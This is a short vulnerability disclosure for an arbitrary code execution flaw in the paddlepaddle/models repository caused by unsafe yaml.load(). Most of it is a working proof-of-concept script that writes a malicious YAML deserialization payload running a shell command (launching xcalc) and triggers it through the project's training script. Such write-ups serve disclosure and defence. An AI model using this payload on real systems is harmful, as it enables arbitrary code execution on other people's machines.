# Description
**Arbitrary Code Excecution** in paddlepaddle/models.
Pre-trained and Reproduced Deep Learning Models.
# Technical Description
This package was vulnerable to Arbitrary code execution due to a use of a known vulnerable function **load()** in **yaml**
# Exploit code
**Python File**
```python
import os
os.system('git clone https://github.com/PaddlePaddle/models.git')
exploit ='''!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
'''
os.chdir('models/dygraph/lac/conf/')
os.system('args.yaml')
open('args.yaml','w+').write(exploit)
os.chdir('../')
os.system('python train.py')
```
# POC
* Run the exploit code 

![](https://cdn.discordapp.com/attachments/749019614352244777/787733999253848064/Screenshot_from_2020-12-13_23-02-32.png)
